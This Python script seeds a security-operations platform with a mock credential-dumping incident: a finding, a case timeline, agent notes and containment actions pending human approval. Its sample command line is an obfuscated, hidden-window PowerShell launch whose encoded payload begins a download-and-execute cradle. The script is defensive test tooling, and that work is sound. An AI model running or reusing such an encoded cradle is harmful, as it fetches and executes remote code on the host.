#!/usr/bin/env python3
"""Simulate an end-to-end incident in AegisSOC AI.

Injects:
1. High-fidelity critical security finding (T1059.001, T1003.001, T1071.001).
2. Autonomous L2 Investigation Case with full timeline reconstruction.
3. Pending L3 Containment Approval Actions (Isolate Host, Block C2 IP) awaiting human sign-off.
"""

from datetime import datetime, timezone
import json
import sys
from pathlib import Path

# Add project root to path
PROJECT_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(PROJECT_ROOT))

from core.storage.connection import get_db_manager
from core.storage.models.finding import Finding
from core.storage.models.case import Case
from core.storage.models.base import case_findings
from core.response.approval_service import ApprovalService, ActionType, Reversibility
from core.time import utcnow


def main():
    print("=======================================================")
    print("🚀  AegisSOC AI - Mock Incident Simulation Engine")
    print("=======================================================\n")

    db_manager = get_db_manager()
    if db_manager._engine is None:
        db_manager.initialize()

    now = utcnow()
    finding_id = "f-20260923-mimikatz-ws042"
    case_id = "CASE-2026-0923-01"

    with db_manager.session_scope() as session:
        # 1. Clean existing mock run if any
        existing_case = session.query(Case).filter_by(case_id=case_id).first()
        if existing_case:
            session.delete(existing_case)
        existing_finding = session.query(Finding).filter_by(finding_id=finding_id).first()
        if existing_finding:
            session.delete(existing_finding)
        session.flush()

        # 2. Inject Suspicious Telemetry Finding
        print(f"[*] Ingesting raw security telemetry finding: {finding_id}...")
        finding = Finding(
            finding_id=finding_id,
            data_source="EDR / CrowdStrike Falcon",
            anomaly_score=0.965,
            severity="critical",
            status="investigating",
            description="Suspicious LSASS memory dump via obfuscated PowerShell on ws-finance-042.corp.local",
            entity_context={
                "hostname": "ws-finance-042.corp.local",
                "internal_ip": "10.0.4.42",
                "username": "smit.admin",
                "process_name": "powershell.exe",
                "process_id": 5124,
                "command_line": "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAA...",
                "parent_process": "excel.exe (PID 4892)",
                "c2_ip": "198.51.100.42",
                "c2_port": 443,
                "target_process": "lsass.exe",
            },
            evidence_links=[
                {"label": "CrowdStrike Alert ID", "url": "cs://alerts/det-2026-99104"},
                {"label": "Network PCAP Capture", "url": "s3://pcap/ws-finance-042-20260923.pcap"},
            ],
            ai_enrichment={
                "triage_summary": "High-confidence credential dumping attack chain following weaponized phishing document execution.",
                "mitre_tactics": ["Execution", "Credential Access", "Command and Control"],
                "mitre_techniques": ["T1059.001", "T1003.001", "T1071.001"],
                "threat_actor_attribution": "FIN7 / Carbanak TTP profile",
                "recommended_action": "Immediate endpoint isolation and domain credential invalidation",
            },
            timestamp=now,
            created_at=now,
            updated_at=now,
        )
        session.add(finding)
        session.flush()

        # 3. Create Correlated Investigation Case
        print(f"[*] Correlating into active Security Case: {case_id}...")
        case = Case(
            case_id=case_id,
            title="High-Risk Intrusion: Credential Dumping & C2 Beaconing on ws-finance-042",
            description=(
                "Autonomous AegisSOC Investigation:\n"
                "Malicious macro executed from finance spreadsheet (invoice_sept_2026.xlsm) spawning encoded PowerShell. "
                "Adversary attempted memory extraction against lsass.exe and established an encrypted C2 beacon to 198.51.100.42."
            ),
            status="investigating",
            priority="critical",
            assignee="AegisSOC AI Autonomous Agent",
            tags=["credential-dumping", "lsass-access", "c2-beacon", "macro-execution", "fin7-ttps"],
            mitre_techniques=["T1059.001", "T1003.001", "T1071.001"],
            timeline=[
                {
                    "timestamp": now.isoformat(),
                    "source": "EDR",
                    "event_type": "Process Execution",
                    "summary": "excel.exe (PID 4892) spawned powershell.exe (PID 5124) with base64 encoded parameters",
                    "severity": "high",
                },
                {
                    "timestamp": now.isoformat(),
                    "source": "AegisSOC Investigator",
                    "event_type": "Memory Extraction Attempt",
                    "summary": "Process PID 5124 requested OpenProcess with PROCESS_VM_READ access to lsass.exe",
                    "severity": "critical",
                },
                {
                    "timestamp": now.isoformat(),
                    "source": "Network Firewall",
                    "event_type": "C2 Handshake",
                    "summary": "Outbound TLS connection initiated to unclassified IP 198.51.100.42:443 (Periodic 60s beacons)",
                    "severity": "critical",
                },
            ],
            notes=[
                {
                    "author": "AegisSOC Triage Agent",
                    "created_at": now.isoformat(),
                    "text": "Initial triage confirmed true positive. Anomaly score 0.965. Zero false-positive precedents for this hash.",
                },
                {
                    "author": "AegisSOC Investigator Agent",
                    "created_at": now.isoformat(),
                    "text": "Reconstructed full kill chain. Blast radius currently confined to ws-finance-042. Immediate containment recommended.",
                },
            ],
            resolution_steps=[
                {"step": 1, "description": "Isolate host ws-finance-042 from internal and external networks.", "status": "pending_approval"},
                {"step": 2, "description": "Block C2 destination IP 198.51.100.42 at edge firewall.", "status": "pending_approval"},
                {"step": 3, "description": "Force credential revocation and password reset for user smit.admin.", "status": "in_progress"},
            ],
            created_at=now,
            updated_at=now,
        )
        case.findings.append(finding)
        session.add(case)
        session.flush()

    # 4. Generate L3 Containment Approval Actions
    print("[*] Generating pending L3 Human-in-the-Loop containment approval actions...")
    approval_svc = ApprovalService()

    # Action 1: Host Isolation
    action1 = approval_svc.create_action(
        action_type=ActionType.ISOLATE_HOST,
        title="Isolate Host ws-finance-042.corp.local",
        description="Cut all non-remediation network traffic to workstation ws-finance-042 to prevent lateral movement.",
        target="ws-finance-042.corp.local",
        confidence=0.965,
        reason="Confirmed LSASS credential access and active C2 beaconing. Immediate containment required.",
        evidence=[
            "PID 5124 (powershell.exe) accessed LSASS memory",
            "Outbound persistent beacon to 198.51.100.42:443",
            "Compromised credential: smit.admin",
        ],
        created_by="AegisSOC Responder Agent",
        reversibility=Reversibility.IRREVERSIBLE,
        parameters={"hostname": "ws-finance-042.corp.local", "adapter": "all", "case_id": case_id},
        idempotency_key=f"mock-isolate-{case_id}-pending",
    )
    print(f"   [+] Created pending approval: {action1.action_id} -> {action1.title}")

    # Action 2: Perimeter IP Block
    action2 = approval_svc.create_action(
        action_type=ActionType.BLOCK_IP,
        title="Block Adversary C2 IP 198.51.100.42",
        description="Deploy firewall drop rule across perimeter gateways for known C2 IP 198.51.100.42.",
        target="198.51.100.42",
        confidence=0.980,
        reason="Active Command & Control channel associated with FIN7 TTP campaign.",
        evidence=[
            "10.0.4.42:49812 -> 198.51.100.42:443",
            "SSL Certificate CN matches known adversary infrastructure pattern",
        ],
        created_by="AegisSOC Network Analyst Agent",
        reversibility=Reversibility.IRREVERSIBLE,
        parameters={"ip": "198.51.100.42", "direction": "both", "case_id": case_id},
        idempotency_key=f"mock-block-ip-{case_id}-pending",
    )
    print(f"   [+] Created pending approval: {action2.action_id} -> {action2.title}")

    print("\n✅  Mock Incident Simulation complete!")
    print(f"    - Case ID: {case_id}")
    print(f"    - Finding ID: {finding_id}")
    print(f"    - Workstation: ws-finance-042.corp.local")
    print("    - Web Console: http://localhost:7788/#/cases")
    print("    - Approvals Queue: http://localhost:7788/#/approvals")


if __name__ == "__main__":
    main()
